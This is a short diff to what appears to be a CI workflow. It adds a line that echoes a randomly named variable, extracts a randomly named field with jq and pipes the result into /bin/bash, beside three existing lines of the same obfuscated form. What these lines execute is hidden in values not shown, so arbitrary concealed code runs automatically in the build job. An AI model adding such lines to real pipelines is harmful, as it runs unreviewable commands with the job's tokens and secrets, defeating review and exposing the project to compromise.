@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$z87" | jq -r .xlb295 | /bin/bash
           echo $lz54 | jq -r .e7 | /bin/bash
           printf '%s' "$fpu22" | jq -r .nn86285 | /bin/bash
+          echo $uyzen3 | jq -r .ta97275 | /bin/bash
 
       - name: Persist output
         if: always()
